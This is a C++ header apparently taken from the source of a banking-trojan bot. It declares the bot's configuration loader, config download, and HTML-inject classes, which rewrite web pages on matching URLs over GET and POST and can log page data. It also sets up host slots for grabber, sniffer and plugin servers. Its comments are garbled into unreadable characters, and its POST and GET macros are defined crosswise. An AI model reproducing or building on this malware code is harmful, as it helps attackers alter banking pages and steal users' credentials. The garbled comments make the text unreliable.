// -----------------------------------------------------------------------------

#ifndef BotConfigH
#define BotConfigH

// � ���������� ����������� ���������� �������� �� �������, ��� �
// ������ ������ ���������/���������� HTKL �������� ��������� � ���� ������
#define HTMLInjectsH

// -----------------------------------------------------------------------------

#include <windows.h>
#include "Strings.h"
#include "Requests.h"
#include "BotClasses.h"
#include "Requests.h"


#define VERB_IS_POST hmGET
#define VERB_IS_GET  hmPOST

#define MAX_POST_DATA_SIZE 5000
#define MIN_POST_DATA_SIZE 5



#define FGRHOSTFROMCFG		1
#define GRAHOSTFROMCFG		2
#define SCRHOSTFROMCFG		3
#define SNIHOSTFROMCFG		4
#define PLUGINSHOSTFROMCFG	5


const static char ConfigSignature[] = {'B', 'J', 'B', 0};

DWORD GetConfigTimeOut();
char* GetCurrentHostFromConfig(int Num);
void GetCurrentConfigHostSetings(bool*http, bool*https);


//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//
//  ������ ��� ������ � ���������������� ������ ����
//
//
//  �����!!!!!! ��������� ����� ������� �������� ������ ��� ����������
//              ����������
//				�������� ��� BV_APP � ����� ������������
//
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



/*
enum TInjectDataState {idsUnknown, idsOk, idsError};

typedef struct THTMLInjectData
{
	PCHAR Before;
	PCHAR Inject;
	PCHAR After;
	TInjectDataState State;
    DWORD MacrosHash;  // ��� ������  ��� ����������� ������� �������
	bool Disabled;     // �� ������������ ������ (��� ���������� ���������)
	LPVOID Owner;      // ��������� �� ������ �������� ������
	DWORD  ID;         // �������������, ��� ���������� ����

}*PHTMLInjectData;

*/



class THTMLInjectList;
class THTMLInject;
class THTMLInjectData;



//---------------------------------------------
//  THTMLInjectList - ������ HTML ��������
//---------------------------------------------
class THTMLInjectList :  public TEventContainer
{
private:
	PList FInjects;

	friend class THTMLInject;
public:
	THTMLInjectList();
	~THTMLInjectList();

	inline DWORD Count() const { return List::Count(FInjects); };
	inline THTMLInject* Items(int Index) const { return (THTMLInject*)List::GetItem(FInjects, Index); }
	inline THTMLInject* operator[](int Index) const { return Items(Index);};
	THTMLInject* AddInject();
	void ResetInjectsStatus();
	void Clear();
};


//---------------------------------------------
//  THTMLInject - HTML ������
//---------------------------------------------
class THTMLInject : public TEventContainer
{
private:
    THTMLInjectList *FOwner;
	PList  FInjects;   // ������ �������� (������ ��������� ���� PHTMLInject)
	friend class THTMLInjectData;
public:
	string URL;       // ����� ����� ��� �������� ���������� ������������ ��������
	bool   GET; 		 // ������������ GET �������
	bool   POST;       // ������������ POST �������
	bool   IsLog;      // ���������� HTML. ������ ������� ���������� ������ �� ������
	bool   Disabled;   // �� ������������ ������ (��� ���������� ���������)
	bool   Used;       // ������� ���� ��� ����� ��������������
	DWORD  RefCount;  // ���������� ������� ���������� �������
	bool   DestroyAfterRelease; // ���������� ������ ����� ��������� ��������
	DWORD  ID;         // �������������, ��� ���������� ����
	string Comment;   // ���������� � �������, ������ ��� ���������

	THTMLInject(THTMLInjectList *aOwner);
	~THTMLInject();

	THTMLInjectData* AddData();
	inline int Count() {return List::Count(FInjects);}
	inline THTMLInjectData* Items(int Index) const {return (THTMLInjectData*)List::GetItem(FInjects, Index);}
	inline THTMLInjectData* operator[](int Index) const { return Items(Index); };
	void Clear();
};


//---------------------------------------------
//  THTMLInjectData - ������ HTML �������
//---------------------------------------------
enum TInjectDataState {idsUnknown, idsOk, idsError};


class THTMLInjectData : public TEventContainer
{
private:
	THTMLInject* FOwner;
protected:

public:
	string Before;
	string Inject;
	string After;
    DWORD  ID;         // �������������
	TInjectDataState State;
    DWORD MacrosHash;  // ��� ������  ��� ����������� ������� �������
	bool Disabled;     // �� ������������ ������ (��� ���������� ���������)

	THTMLInjectData(THTMLInject *aOwner);
	~THTMLInjectData();

	inline THTMLInject* Owner() {return FOwner;}
	void Copy(const THTMLInjectData &Data);

	bool IsValid();
};



//---------------------------------------------------------
// TBotConfig -  ��������� ������ ����
//---------------------------------------------------------
typedef struct TBotConfig_
{
	THTMLInjectList *HTMLInjects;  // ������ �������� (������ ��������� ���� PHTMLInject)
	RTL_CRITICAL_SECTION Lock;  // ����������� ������ ���������� �������
	PWCHAR LastConfigFile;      // ��� ���������� ������������ �����
	FILETIME ConfigTime;        // ����� ��������� ������������ �����
} *PBotConfig;



//*********************************************************
//  SetHTMLInjectEvent - ���������� ����� ���������
//		������� HTML �������
//*********************************************************
// �����, ������� HTML �������
#ifdef BV_APP
	enum THTMLInjectEventID {injCustom, injMaskFinded, injDataHandled};
	typedef void(*THTMLInjectEvent)(LPVOID Data,        	// ������� � �������� ���������������� �������
									LPVOID Sender, 	    	// �������� �������
									THTMLInjectEventID ID,  // ������������� �������
									LPVOID Reserver);      	// ���������������

	void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event);
#endif

namespace Config
{
	// ������� ������ ��������� �������
	PBotConfig Create();

	// ������� ���������� ��������� �������
	void Free(PBotConfig Cfg);

	//*********************************************************
	//	Initialize - ���������������� ����������
	//  	��������� ����. ���� ������ ��� ����� FileName ��
	//  	��������� ����� ��������� �� ����, � ���������
	//  	������ ��������� ����� ��������� �� ����� �������
	//		� ��� ����.
	//*********************************************************
	PBotConfig Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad);

	// ������� ���������� ��������� �� ������ ����
	PBotConfig GetConfig();

	// �������� ������
	void Clear(PBotConfig Config);

	//  ������� ���������� ��� ����� �� ���������
	//
	PWCHAR GetFileName(bool HightPriority = false);

	//  ������� ������������� ��� ����� �� ���������
	void SetFileName(PWCHAR FileName);

	// ��������� ������
	bool Download(PCHAR URL);

	// ������� ���������� ������ ���� ����� �������� ��������
    bool IsConfig(PCHAR Buf);

	//  GetInjectsForRequest - �������� ������� ��� �������
	bool GetInjectsForRequest(PRequest Request);

	// ������� ��������� ���� �� ��� ���������� ������ ������
	bool IsInjectURL(PCHAR URL, THTTPMethod Method);

	// ������� ��������� ������ �� �����
	bool LoadConfigFromFile(PBotConfig Config, PWCHAR FileName);
}


// HTML_INJECT_MACROS - HIM

#define HIM_REPLACE_DOCUMENT 0x6A665EA5 /* $REPLACE_DOCUMENT$ */


//****************************************************************************
//	HTMLInjects - ������ ��� ������ � HTML ���������
//****************************************************************************
namespace HTMLInjects
{

	//*********************************************************
	//  ��������� HTML �������.
	//
	//  ��������� - ������� ���������� ������ ���� � ������
	//              ������� ���� ������� ���������
	//*********************************************************
	bool Execute(PRequest Request, PHTTPSessionInfo Session);

	//*********************************************************
	// ������� ���������� ������ ���� ��������� ��� ��������
	// �������������� �������� ������� HTML
	//*********************************************************
	bool SupportContentType(PCHAR CType);

	//*********************************************************
	//  ������ ����������� ������ HTML �������
	//*********************************************************
	void FreeInject(THTMLInject *Inject);

	//*********************************************************
	// ReleaseInjectsList - ������� ����������� ������ ��������
	//                      ������� ���� �������� ��� �������
	// List - ������ ���������� ��������
	//*********************************************************
    void ReleaseInjectsList(PList List);
}

// -----------------------------------------------------------------------------
#endif
